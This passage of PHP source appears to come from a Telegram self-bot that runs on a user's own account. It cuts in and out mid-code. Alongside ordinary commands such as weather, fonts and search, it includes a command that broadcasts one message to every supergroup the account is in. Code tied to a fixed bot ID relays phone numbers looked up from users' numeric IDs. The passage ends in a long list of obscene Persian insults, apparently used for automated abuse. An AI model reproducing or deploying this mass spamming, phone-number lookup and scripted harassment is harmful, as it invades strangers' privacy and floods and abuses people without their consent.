                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
                    }
                    if (preg_match("/^[\/\#\!]?(panel)$/si", $text)) {
                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โขยป ๐ถ๐๐๐ ๐ป๐๐ ๐บ๐๐๐ ๐ด๐๐๐๐๐๐๐๐๐ ๐ท๐๐๐๐ ยซโข", 'parse_mode' => 'MarkDown']);
                        $Helper = file_get_contents('helper.txt');
                        $messages_BotResults = yield $this->messages->getInlineBotResults(['bot' => "@$Helper", 'peer' => $peer, 'query' => "pawnselfyspanel_", 'offset' => '0',]);
                        $query_id = $messages_BotResults['query_id'];
                        $query_res_id = $messages_BotResults['results'][0]['id'];
                        yield $this->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true,
                            'peer' => $peer, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id",]);
                    }

                    if (preg_match("/^[\/\#\!]?(search) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(search) (.*)$/si", $text, $m);
                        $q = $m[2];
                        $res_search = yield $this->messages->search(['peer' => $peer, 'q' => $q, 'filter' => ['_' => 'inputMessagesFilterEmpty'], 'min_date' => 0, 'max_date' => time(), 'offset_id' => 0, 'add_offset' => 0, 'limit' => 50, 'max_id' => $message['id'], 'min_id' => 1]);
                        $texts_count = count($res_search['messages']);
                        $users_count = count($res_search['users']);
                        $this->messages->sendMessage(['peer' => $peer, 'message' => "Msgs Found: $texts_count \nFrom Users Count: $users_count"]);
                        foreach ($res_search['messages'] as $text) {
                            $textid = $text['id'];
                            yield $this->messages->forwardMessages(['from_peer' => $text, 'to_peer' => $peer, 'id' => [$textid]]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(font) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(font) (.*)$/si", $text, $m);
                        $query = $m[2];
                        $text2 = str_replace(' ', '+', $query);
                        $link = json_decode(yield $this->fileGetContents("http://api.codebazan.ir/font/?text=$text2"), true);
                        $link2 = $link["result"];
                        $Pawn1 = $link2['1'];
                        $Pawn2 = $link2['2'];
                        $Pawn3 = $link2['3'];
                        $Pawn4 = $link2['4'];
                        $Pawn5 = $link2['5'];
                        $Pawn6 = $link2['6'];
                        $Pawn7 = $link2['7'];
                        $Pawn8 = $link2['8'];
                        $Pawn9 = $link2['9'];
                        $Pawn10 = $link2['10'];
                        $Pawn11 = $link2['11'];
                        $Pawn12 = $link2['12'];
                        $Pawn13 = $link2['13'];
                        $Pawn14 = $link2['14'];
                        $Pawn15 = $link2['15'];
                        $Pawn16 = $link2['16'];
                        $Pawn17 = $link2['17'];
                        $Pawn18 = $link2['18'];
                        $Pawn19 = $link2['19'];
                        $Pawn20 = $link2['20'];
                        $Pawn21 = $link2['21'];
                        $Pawn22 = $link2['22'];
                        $Pawn23 = $link2['23'];
                        $Pawn24 = $link2['24'];
                        $Pawn25 = $link2['25'];
                        $Pawn26 = $link2['26'];
                        $Pawn27 = $link2['27'];
                        $Pawn28 = $link2['28'];
                        $Pawn29 = $link2['29'];
                        $Pawn30 = $link2['30'];
                        $Pawn31 = $link2['31'];
                        $Pawn32 = $link2['32'];
                        $Pawn33 = $link2['33'];
                        $Pawn34 = $link2['34'];
                        $Pawn35 = $link2['35'];
                        $Pawn36 = $link2['36'];
                        $Pawn37 = $link2['37'];
                        $Pawn38 = $link2['38'];
                        $Pawn39 = $link2['39'];
                        $Pawn40 = $link2['40'];
                        $Pawn41 = $link2['41'];
                        $Pawn42 = $link2['42'];
                        $Pawn43 = $link2['43'];
                        $Pawn44 = $link2['44'];
                        $Pawn45 = $link2['45'];
                        $Pawn46 = $link2['46'];
                        $Pawn47 = $link2['47'];
                        $Pawn48 = $link2['48'];
                        $Pawn49 = $link2['49'];
                        $Pawn50 = $link2['50'];
                        $Pawn51 = $link2['51'];
                        $Pawn52 = $link2['52'];
                        $Pawn53 = $link2['53'];
                        $Pawn54 = $link2['54'];
                        $Pawn55 = $link2['55'];
                        $Pawn56 = $link2['56'];
                        $Pawn57 = $link2['57'];
                        $Pawn58 = $link2['58'];
                        $Pawn59 = $link2['59'];
                        $Pawn60 = $link2['60'];
                        $Pawn61 = $link2['61'];
                        $Pawn62 = $link2['62'];
                        $Pawn63 = $link2['63'];
                        $Pawn64 = $link2['64'];
                        $Pawn65 = $link2['65'];
                        $Pawn66 = $link2['66'];
                        $Pawn67 = $link2['67'];
                        $Pawn68 = $link2['68'];
                        $Pawn69 = $link2['69'];
                        $Pawn70 = $link2['70'];
                        $Pawn71 = $link2['71'];
                        $Pawn72 = $link2['72'];
                        $Pawn73 = $link2['73'];
                        $Pawn74 = $link2['74'];
                        $Pawn75 = $link2['75'];
                        $Pawn76 = $link2['76'];
                        $Pawn77 = $link2['77'];
                        $Pawn78 = $link2['78'];
                        $Pawn79 = $link2['79'];
                        $Pawn80 = $link2['80'];
                        $Pawn81 = $link2['81'];
                        $Pawn82 = $link2['82'];
                        $Pawn83 = $link2['83'];
                        $Pawn84 = $link2['84'];
                        $Pawn85 = $link2['85'];
                        $Pawn86 = $link2['86'];
                        $Pawn87 = $link2['87'];
                        $Pawn88 = $link2['88'];
                        $Pawn89 = $link2['89'];
                        $Pawn90 = $link2['90'];
                        $Pawn91 = $link2['91'];
                        $Pawn92 = $link2['92'];
                        $Pawn93 = $link2['93'];
                        $Pawn94 = $link2['94'];
                        $Pawn95 = $link2['95'];
                        $Pawn96 = $link2['96'];
                        $Pawn97 = $link2['97'];
                        $Pawn98 = $link2['98'];
                        $Pawn99 = $link2['99'];
                        $Pawn100 = $link2['100'];
                        $Pawn101 = $link2['101'];
                        $Pawn102 = $link2['102'];
                        $Pawn103 = $link2['103'];
                        $Pawn104 = $link2['104'];
                        $Pawn105 = $link2['105'];
                        $Pawn106 = $link2['106'];
                        $Pawn107 = $link2['107'];
                        $Pawn108 = $link2['108'];
                        $Pawn109 = $link2['109'];
                        $Pawn110 = $link2['110'];
                        $Pawn111 = $link2['111'];
                        $Pawn112 = $link2['112'];
                        $Pawn113 = $link2['113'];
                        $Pawn114 = $link2['114'];
                        $Pawn115 = $link2['115'];
                        $Pawn116 = $link2['116'];
                        $Pawn117 = $link2['117'];
                        $Pawn118 = $link2['118'];
                        $Pawn119 = $link2['119'];
                        $Pawn120 = $link2['120'];
                        $Pawn121 = $link2['121'];
                        $Pawn122 = $link2['122'];
                        $Pawn123 = $link2['123'];
                        $Pawn124 = $link2['124'];
                        $Pawn125 = $link2['125'];
                        $Pawn126 = $link2['126'];
                        $Pawn127 = $link2['127'];
                        $Pawn128 = $link2['128'];
                        $Pawn129 = $link2['129'];
                        $Pawn130 = $link2['130'];
                        $Pawn131 = $link2['131'];
                        $Pawn132 = $link2['132'];
                        $Pawn133 = $link2['133'];
                        $Pawn134 = $link2['134'];
                        $Pawn135 = $link2['135'];
                        $Pawn136 = $link2['136'];
                        $Pawn137 = $link2['137'];
                        $Pawn138 = $link2['138'];

                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
โก ูููุช ูุง? ุงูฺฏู?ุณ? ฺฉููู $query ุทุฑุงุญ? ุชุนุฏุงุฏ ุจู 138 ูููุช : 
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
1 => ๏ธ`$Pawn1`
2 => `$Pawn2`
3 => `$Pawn3`
4 => `$Pawn4`
5 => `$Pawn5`
6 => `$Pawn6`
7 => `$Pawn7`
8 => `$Pawn8`
9 => `$Pawn9`
10 => `$Pawn10`
11 => `$Pawn11`
12 => `$Pawn12`
13 => `$Pawn13`
14 => `$Pawn14`
15 => `$Pawn15`
16 => `$Pawn16`
17 => `$Pawn17`
18 => `$Pawn18`
19 => `$Pawn19`
20 => `$Pawn20`
21 => `$Pawn21`
22 => `$Pawn22`
23 => `$Pawn23`
24 => `$Pawn24`
25 => `$Pawn25`
25 => `$Pawn26`
27 => `$Pawn27`
28 => `$Pawn28`
29 => `$Pawn29`
30 => `$Pawn30`
31 => `$Pawn31`
32 => `$Pawn32`
33 => `$Pawn33`
34 => `$Pawn34`
35 => `$Pawn35`
36 => `$Pawn36`
37 => `$Pawn37`
38 => `$Pawn38`
39 => `$Pawn39`
40 => `$Pawn40`
41 => `$Pawn41`
42 => `$Pawn42`
43 => `$Pawn43`
44 => `$Pawn44`
45 => `$Pawn45`
46 => `$Pawn46`
47 => `$Pawn47`
48 => `$Pawn48`
49 => `$Pawn49`
50 => `$Pawn50`
51 => `$Pawn51`
52 => `$Pawn52`
53 => `$Pawn53`
54 => `$Pawn54`
55 => `$Pawn55`
56 => `$Pawn56`
57 => `$Pawn57`
58 => `$Pawn58`
59 => `$Pawn59`
60 => `$Pawn60`
61 => `$Pawn61`
62 => `$Pawn62`
63 => `$Pawn63`
64 => `$Pawn64`
65 => `$Pawn65`
66 => `$Pawn66`
67 => `$Pawn67`
68 => `$Pawn68`
69 => `$Pawn69`
70 => `$Pawn70`
71 => `$Pawn71`
72 =>`$Pawn72`
73 => `$Pawn73`
74 => `$Pawn74`
75 => `$Pawn75`
76 => `$Pawn76`
77 => `$Pawn77`
78 => `$Pawn78`
79 => `$Pawn79`
80 => `$Pawn80`
81 => `$Pawn81`
82 => `$Pawn82`
83 => `$Pawn83`
84 => `$Pawn84`
85 => `$Pawn85`
86 => `$Pawn86`
87 => `$Pawn87`
88 => `$Pawn88`
89 => `$Pawn89`
90 => `$Pawn90`
91 => `$Pawn91`
92 => `$Pawn92`
93 => `$Pawn93`
94 => `$Pawn94`
95 => `$Pawn95`
96 => `$Pawn96`
97 => `$Pawn97`
98 => `$Pawn98`
99 => `$Pawn99`
100 => `$Pawn100`
101 => `$Pawn101`
102 => `$Pawn102`
103 => `$Pawn103`
104 => `$Pawn104`
105 => `$Pawn105`
106 => `$Pawn106`
107 => `$Pawn107`
108 => `$Pawn108`
109 => `$Pawn109`
110 => `$Pawn110`
111 => `$Pawn111`
112 => `$Pawn112`
113 => `$Pawn113`
114 => `$Pawn114`
115 => `$Pawn115`
116 => `$Pawn116`
117 => `$Pawn117`
118 => `$Pawn118`
119 => `$Pawn119`
120 => `$Pawn120`
121 => `$Pawn121`
122 => `$Pawn122`
123 => `$Pawn123`
124 => `$Pawn124`
125 => `$Pawn125`
126 => `$Pawn126`
127 => `$Pawn127`
128 => `$Pawn128`
129 => `$Pawn129`
130 => `$Pawn130`
131 => `$Pawn131`
132 => `$Pawn132`
133 => `$Pawn133`
134 => `$Pawn134`
135 => `$Pawn135`
136 => `$Pawn136`
137 => `$Pawn137`
138 => `$Pawn138`
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(sendgps) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(sendgps) (.*)$/si", $text, $match);

                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "**ึ ๐๐๐๐๐๐๐**", 'parse_mode' => 'Markdown']);

                        $dialogs = yield $this->getDialogs();
                        $i = 0;
                        foreach ($dialogs as $peer) {
                            try {
                                $type = yield $this->getInfo($peer)['type'];
                                if ($type == 'supergroup') {
                                    yield $this->messages->sendMessage([
                                        'peer' => $peer,
                                        'message' => $match[2]
                                    ]);
                                    $i++;
                                }
                            } catch (\Throwable $e) {

                            }

                        }
                        yield $this->messages->sendMessage([
                            'peer' => $peer,
                            'message' => "**ึ ๐ท๐๐๐๐๐ ๐๐๐๐๐๐๐๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐ ๐๐๐๐ ๐๐ ๐๐๐๐๐๐๐๐๐๐๐ ๐๐ป**\n**๐ต๐๐๐๐๐ ๐๐ ๐๐๐๐๐๐๐๐๐๐๐ :** $i", 'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(weather) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(weather) (.*)$/si", $text, $m);
                        $query = $m[2];
                        $url = json_decode(yield $this->fileGetContents("http://api.openweathermap.org/data/2.5/weather?q=" . $query . "&appid=eedbc05ba060c787ab0614cad1f2e12b&units=metric"), true);
                        $city = $url["name"];
                        $deg = $url["main"]["temp"];
                        $type1 = $url["weather"][0]["main"];
                        if ($type1 == "Clear") {
                            $tpp = 'ุขูุชุงุจ?โ';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Clouds") {
                            $tpp = 'ุงุจุฑ? โโ';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Rain") {
                            $tpp = 'ุจุงุฑุงู? โ';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Thunderstorm") {
                            $tpp = 'ุทููุงู? โโโโ';
                            yield $this->filePutContents('type.txt', $tpp);
                        } elseif ($type1 == "Mist") {
                            $tpp = 'ูู ๐จ';
                            yield $this->filePutContents('type.txt', $tpp);
                        }
                        if ($city != '') {
                            $ziro = file_get_contents('type.txt');
                            $txt = "ุฏูุง? ุดูุฑ $city ูู ุงฺฉููู $deg ุฏุฑุฌู ุณุงูุช? ฺฏุฑุงุฏ ู? ุจุงุดุฏ

ุดุฑุง?ุท ูุนู? ุขุจ ู ููุง: $ziro";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                            unlink('type.txt');
                        } else {
                            $txt = "โ ๏ธุดูุฑ ููุฑุฏ ูุธุฑ ุดูุง ูุงูุช ูุดุฏ";
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(sessions)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐น๐๐๐๐๐๐๐๐** [๐๐๐๐๐๐๐](mention:$fromId) **๐๐๐๐๐๐๐๐๐๐๐ ...!**", 'parse_mode' => 'Markdown']);
                        $authorizations = yield $this->account->getAuthorizations();
                        $txxt = "";
                        foreach ($authorizations['authorizations'] as $authorization) {
                            $txxt .= "
ูุด: " . $authorization['hash'] . "
ูุฏู ุฏุณุชฺฏุงู: " . $authorization['device_model'] . "
ุณ?ุณุชู ุนุงูู: " . $authorization['platform'] . "
ูุฑฺู ุณ?ุณุชู: " . $authorization['system_version'] . "
api_id: " . $authorization['api_id'] . "
app_name: " . $authorization['app_name'] . "
ูุณุฎู ุจุฑูุงูู: " . $authorization['app_version'] . "
ุชุงุฑ?ุฎ ุง?ุฌุงุฏ: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
ุชุงุฑ?ุฎ ูุนุงู: " . date("Y-m-d H:i:s", $authorization['date_active']) . "
ุข?โูพ?: " . $authorization['ip'] . "
ฺฉุดูุฑ: " . $authorization['country'] . "
ููุทูู: " . $authorization['region'] . "

====================";
                        }
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $txxt]);
                        yield $this->filePutContents('Sessions.txt', "$txxt");
                    }
                    if (preg_match("/^[\/\#\!]?(gpinfo)$/si", $text)) {
                        $peer_inf = yield $this->getFullInfo($message['to_id']);
                        $peer_info = $peer_inf['Chat'];
                        $peer_id = $peer_info['id'];
                        $peer_title = $peer_info['title'];
                        $peer_type = $peer_inf['type'];
                        $peer_count = $peer_inf['full']['participants_count'];
                        $des = $peer_inf['full']['about'];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐น๐๐๐๐๐๐๐๐ ๐๐๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐ ...!**", 'parse_mode' => 'Markdown']);
                        $mes = "**๐ฐ๐ซ:** $peer_id \n\n**๐ป๐๐๐๐:** $peer_title \n\n**๐ป๐๐๐:** $peer_type \n\n**๐ด๐๐๐๐๐๐ ๐ช๐๐๐๐:** $peer_count \n\n**๐ฉ๐๐:** $des";
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $mes, 'parse_mode' => 'Markdown']);
                    }
                }
            }
            if ($data['power'] == "on") {
                if ($fromId != $owner) {

                    $typing = yield $this->getLocalContents("typing.txt");
                    $gameplay = yield $this->getLocalContents("gameplay.txt");
                    $audioaction = yield $this->getLocalContents("audioaction.txt");
                    $videoaction = yield $this->getLocalContents("videoaction.txt");
                    $gameplaypv = yield $this->getLocalContents("gamepv.txt");
                    $markread = yield $this->getLocalContents("markread.txt");
                    $lockpv = yield $this->getLocalContents("lockpv.txt");
                    $lockgp = yield $this->getLocalContents("lockgp.txt");
                    $lockmedia = yield $this->getLocalContents("lockmedia.txt");
                    $antilogin = yield $this->getLocalContents("antilogin.txt");
                    $locklink = yield $this->getLocalContents("locklink.txt");
                    $locktag = yield $this->getLocalContents("locktag.txt");
                    $lockvia = yield $this->getLocalContents("lockvia.txt");
                    $autochat = yield $this->getLocalContents("autochat.txt");
                    $lockphoto = yield $this->getLocalContents("lockphoto.txt");
                    $lockmention = yield $this->getLocalContents("lockmention.txt");
                    $lockforward = yield $this->getLocalContents("lockforward.txt");

                    if ($message && $typing == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
                    }
                    if ($message && $gameplay == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                    }
                    if ($message && $audioaction == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordAudioAction]);
                    }
                    if ($message && $videoaction == 'on' && $update['_'] == "updateNewChannelMessage") {
                        $sendMessageRecordVideoAction = ['_' => 'sendMessageRecordVideoAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordVideoAction]);
                    }
                    if ($gameplaypv == 'on') {
                        $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
                        yield $this->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
                    }
                    if ($message && $data['echo'] == "on") {
                        yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $peer, 'id' => [$message['id']]]);
                    }
                    if ($message && $markread == 'on') {
                        if (intval($peer) < 0) {
                            yield $this->channels->readHistory(['channel' => $peer, 'max_id' => $message['id']]);
                            yield $this->channels->readMessageContents(['channel' => $peer, 'id' => [$message['id']]]);
                        } else {
                            yield $this->messages->readHistory(['peer' => $peer, 'max_id' => $message['id']]);
                        }
                    }
                    if (strpos($text, '๐') !== false and $data['poker'] == "on") {
                        yield $this->sleep(3);
                        $this->messages->sendMessage(['peer' => $peer, 'message' => '๐', 'reply_to_msg_id' => $message['id']]);
                    }
                    if (strpos($text, "โ #ุดูุงุฑู_ูพ?ุฏุง_ุดุฏ") !== false && $fromId == 1565231209) {
                        $text2 = explode("\n", $text)[2];
                        $e1 = str_replace("โ๏ธ ุดูุงุฑู : ", "", $text2);
                        $msgsgs = yield $this->getLocalContents("msgid25.txt");
                        $perer = yield $this->getLocalContents("peer5.txt");
                        $e = yield $this->getLocalContents("id.txt");
                        yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "ยป ุดูุงุฑู ุชููู : `$e1`
ยป ุข?ุฏ? ุนุฏุฏ? : `$e`", 'parse_mode' => 'markdown']);
                        unlink("msgid25.txt");
                        unlink("peer5.txt");
                        unlink("id.txt");
                    }

                    if (strpos($text, "โ #ุดูุงุฑู_ูพ?ุฏุง_ูุดุฏ") !== false && $fromId == 1565231209) {
                        $msgsgs = yield $this->getLocalContents("msgid25.txt");
                        $perer = yield $this->getLocalContents("peer5.txt");
                        $e = yield $this->getLocalContents("id.txt");
                        yield $this->messages->editMessage(['peer' => $perer, 'id' => $msgsgs, 'message' => "ยป ุดูุงุฑู ูพ?ุฏุง ูุดุฏ ! ยซ",
                            'parse_mode' => 'markdown']);
                        unlink("msgid25.txt");
                        unlink("peer5.txt");
                        unlink("id.txt");
                    }

                    if ($type3 == 'user') {
                        if ($text == $text and $lockpv == 'on') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุดูุง ุจู ุฏู?ู ูุนุงู ุจูุฏู ุญุงูุช Lockpv ุจูุงฺฉ ุดุฏ?ุฏ!"]);
                            yield $this->messages->sendMessage(['peer' => $owner, 'message' => "ฺฉุงุฑุจุฑ $peer ุจู ุฏู?ู ุฑูุดู ุจูุฏู ุญุงูุช lockpv ุจูุงฺฉ ุดุฏ!"]);
                            yield $this->contacts->block(['id' => $peer]);
                        }
                    }

                    $fohsh = [
                        "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช๐๐๐๐", "ุจุงูุง ุจุงุด ฺฉ?ุฑู ฺฉุต ูุงุฏุฑุช๐๐๐", "ูุงุฏุฑุชู ู?ฺฏุงู ููฺู ุฌูู ุจุงูุง๐๐๐", "ุงุจ ุฎุงุฑฺฉุตุชู ุชูุฏ ุชูุฏ ุชุง?ูพ ฺฉู ุจุจ?ูู", "ูุงุฏุฑุชู ู?ฺฏุงู ุจุฎุง? ูุฑุงุฑ ฺฉู?", "ูุงู ุดู ุฏ?ฺฏู ููฺู", "ูุงุฏุฑุชู ู?ฺฏุงู ุงู ุจุด?", "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช", "ฺฉ?ุฑู ฺฉุต ูุต ูุงุฏุฑุช ุจุงูุง", "ฺฉ?ุฑู ุชู ฺุดู ฺุงู ูุงุฏุฑุช", "ฺฉูู ูุงุฏุฑุชู ู?ฺฏุงู ุจุงูุง", "ุจ?ูุงููุณ  ุฎุณุชู ุดุฏ?ุ", "ูุจ?ูู ุฎุณุชู ุจุด? ุจ?ูุงููุณ", "ููุชู ู?ฺฉูู", "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช ๐๐๐๐๐๐๐", "ุตูู ุชู ฺฉุตููุช ุจุงูุง", "ุจ?ูุงููุณ ุจุงูุง ุจุงุด ุจูุช ู?ฺฏู", "ฺฉ?ุฑ ุชู ูุงุฏุฑุช", "ฺฉุต ูุต ูุงุฏุฑุชู ุจู?ุณูุ", "ฺฉุต ูุงุฏุฑุชู ฺูฺฏ ุจุฒููุ", "ุจู ุฎุฏุง ฺฉุตููุช ุจุงูุง ", "ูุงุฏุฑุชู ู?ฺฏุงู ", "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช ุจ?ูุงููุณ", "ูุงุฏุฑุฌูุฏู ุจุงูุง ุจุงุด", "ุจ?ูุงููุณ ุชุง ฺฉ? ู?ุฎุง? ุณุทุญุช ฺฏุญ ุจุงุดู", "ุงูพุฏ?ุช ุดู ุจ?ูุงููุณ ุฎุฒ ุจูุฏ", "ุง? ุชูุฑฺฉ ุฎุฑ ุจุงูุง ุจุจ?ูู", "ู ุงูุง ุชู ุจ?ูุงููุณ ฺููุด", "ุชู ?ฺฉ?ู ูุงุฏุฑุชู ู?ฺฉูู", "ฺฉ?ุฑู ุชู ูุงููุตุช ", "ฺฉ?ุฑ ุชู ููุช", "ุฑ?ุด ุฑูุญุงู? ุชู ููุช", "ฺฉ?ุฑ ุชู ูุงุฏุฑุช๐๐๐", "ฺฉุต ูุงุฏุฑุชู ูุฌุฑ ุจุฏู", "ุตูู ุชู ููุช", "ุจุงุช ุชู ููุช ", "ูุงูุงูุชู ู?ฺฉูู ุจุงูุง", "ูุง? ุง?ู ุชูุฑฺฉ ุฎุฑู", "ุณุทุญุดู ูฺฏุง", "ุชุง?ูพ ฺฉู ุจ?ูุงููุณ", "ุฎุดุงุจุ", "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช ุจุงูุง", "ุจ?ูุงููุณ ูุจ?ูู ุฎุณุชู ุจุด?", "ูุงุฏุฑุชู ุจฺฏุงูุ", "ฺฏุญ ุชู ุณุทุญุช ุดุฑูุช ุฑู", "ุจ?ูุงููุณ ุดุฑูุชู ูุงุจูุฏ ฺฉุฑุฏู ?ู ฺฉุงุฑ? ฺฉู", "ูุง? ฺฉ?ุฑู ุชู ุณุทุญุช", "ุจ?ูุงููุณ ุฑูุงู? ุดุฏ?", "ุฑูุงู?ุช ฺฉุฑุฏูุง", "ูุงุฏุฑุชู ฺฉุฑุฏู ฺฉุงุฑ? ฺฉู", "ุชุง?ูพ ุชู ููุช", "ุจ?ูพุฏุฑ ุจุงูุง ุจุงุด", "ู ุงูุง ุชู ูุฑ ุฎุฑ", "ููุชู ู?ฺฉูู ุจุงูุง ุจุงุด", "ฺฉ?ุฑู ูุจ ูุงุฏุฑุช ุจุงูุง๐๐๐", "ฺุทูุฑู ุจุฒูู ูุตูุชู ฺฏุญ ฺฉูู", "ุฏุงุฑ? ุชุธุงูุฑ ู?ฺฉู? ุงุฑูู? ูู? ูุงุฏุฑุชู ฺฉูุต ฺฉุฑุฏู", "ูุงุฏุฑุชู ฺฉุฑุฏู ุจ?ุบ?ุฑุช", "ูุฑุฒู", "ูุง? ุฎุฏุง? ูู ุง?ูู ูฺฏุง", "ฺฉ?ุฑ ุชู ฺฉุตููุช", "ููุชู ุจู?ุณู", "ููู ูฺฏุง ุจ?ูุงููุณ", "ฺฉ?ุฑ ุชู ููุช ุจุณู ุฏ?ฺฏู", "ุฎุณุชู ุดุฏ?ุ", "ููุชู ู?ฺฉูู ุฎุณุชู ุจุด?", "ูุง? ุฏูู ฺฉูู ูุงุฏุฑุช ุจฺฏุงู", "ุงู ุดู ุงุญูู", "ุจ?ุดุฑู ุงู ุดู ุจูุช ู?ฺฏู", "ูุงูุงู ุฌูุฏู ุงู ุดู", "ฺฉุต ูุงูุงูุช ุงู ุดู", "ฺฉุต ูุด ูุง ูู ฺฉู ุง?ูุฌูุฑ? ุจฺฏูุ", "ุง? ุจ?ูุงููุณ ฺููุด", "ุฎุงุฑฺฉูุตุชู ุง? ูุง", "ูุงูุงูุชู ู?ฺฉูู ุงู ูุด?", "ฺฏุญ ุชู ููุช", "ุณุทุญ ?ู ฺฏุญ ุตูุชู", "ฺฏุญ ฺฉุฑุฏู ุชู ูุตูุชุง", "ฺู ุฑู?? ุฏุงุฑ? ุจ?ูุงููุณ", "ูุงููุณุชู ฺฉุฑุฏู", "ุฑู ฺฉุต ูุงุฏุฑุช ฺฉ?ุฑ ฺฉููุ๐๐๐", "ููฺู ุจุงูุง", "ฺฉ?ุฑู ุชู ูุงููุตุชุงุง๐๐", "?ุง ูุงุฏุฑุชู ู?ฺฏุงู ?ุง ุงู ู?ุด?", "ูุงูุดู ุฏ?ฺฏู", "ุจ?ูุงููุณ", "ูุงุฏุฑฺฉุตุชู", "ูุงููุต ฺฉุตุฏู", "ูุง? ุจุฏู ุจุจ?ูู ู?ุฑุณ?", "ฺฉ?ุฑู ฺฉูู ูุงุฏุฑุช ฺ?ฺฉุงุฑ ู?ฺฉู? ุงุฎู", "ุฎุงุฑฺฉุตุชู ุจุงูุง ุฏ?ฺฏู ุนู", "ฺฉ?ุฑู ฺฉุตูุงุฏุฑุช๐๐๐", "ฺฉ?ุฑู ฺฉูู ูุงููุตุฏ๐๐๐", "ุจ?ูุงููุณ ูู ุฎูุฏู ุฎุณุชู ุดุฏู ุชูฺ?ุ", "ุง? ุดุฑู ูุฏุงุฑ", "ูุงูุงูุชู ฺฉุฑุฏู ุจ?ุบ?ุฑุช", "ู ุงูุง ูุงุฏุฑ ุฌูุฏุช", "ุชู ?ฺฉ? ุฒ?ุฑ ุจุงุด", "ุงู ุดู", "ุฎุงุฑุชู ฺฉูุต ู?ฺฉูู", "ฺฉูุตูุงููุตุฏ", "ูุงููุต ฺฉูู?", "ุฎุงุฑฺฉุตุชู ? ุจ? ุบ?ุฑุช", "ุดุฑู ฺฉู ุจ?ูุงููุณ", "ูุงูุงูุชู ฺฉุฑุฏ ", "ุง? ูุงุฏุฑุฌูุฏู", "ุจ?ุบ?ุฑุช", "ฺฉ?ุฑุชู ูุงููุตุช", "ุจ?ูุงููุณ ูู?ุฎุง? ุงู ุจุด?ุ", "ุง? ุฎุงุฑฺฉูุตุชู", "ูุงูุดู ุฏ?ฺฏู", "ููู ฺฉุณ ฺฉูู?", "ุญุฑุงูุฒุงุฏู", "ูุงุฏุฑุชู ู?ฺฉูู", "ุจ?ูุงููุณ", "ฺฉุตุดุฑ", "ุงู ุดู ูุงุฏุฑฺฉูุตุชู", "ุฎุงุฑฺฉุตุชู ฺฉุฌุง??", "ููุชู ฺฉุฑุฏู ฺฉุงุฑ? ูู?ฺฉู?ุ", "ฺฉ?ุฑุชู ูุงุฏุฑุช ูุงู", "ฺฉ?ุฑุชู ููุช ุจุณู", "ฺฉ?ุฑุชู ุดุฑูุช", "ูุงุฏุฑุชู ู?ฺฏุงู ุจุงูุง", "ฺฉ?ุฑ ุชู ูุงุฏุฑุช"
